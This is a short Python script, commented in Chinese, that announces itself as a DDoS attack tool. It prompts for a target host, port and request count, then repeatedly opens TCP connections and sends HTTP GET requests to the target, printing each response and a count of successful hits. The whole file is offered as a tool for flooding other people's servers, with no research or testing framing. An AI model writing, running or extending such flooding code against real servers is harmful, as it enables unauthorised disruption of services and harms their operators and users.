print("来自lsahn开发的ddos攻击工具！")
url = input("目标的IP或域名:")
port = input("端口")
time = input("对目标服务器访问次数:")
portt = int(port)
timee = int(time)
tt = 0
import socket
while timee > 0:
    # 创建一个TCP socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((url, portt))
        # 连接到目标服务器

        # 构造一个HTTP GET请求
        request = f"GET / HTTP/1.1\r\nHost: {url}\r\n\r\n"

        # 发送请求
        client.send(request.encode())

        # 接收响应
        response = client.recv(4096)  # 接收最多4096字节
        print(response.decode())
        timee = timee - 1
        print(f"访问成功,这是第 {tt} 次")
        tt = tt + 1
        if timee == 0:
            print("执行完毕")
            print(f"计划执行{time}次,成功执行了 {tt} 次")
    
    except Exception as e:
        print(f"连接或发送数据失败: {e}")
        client.close()
            # 关闭连接
        break
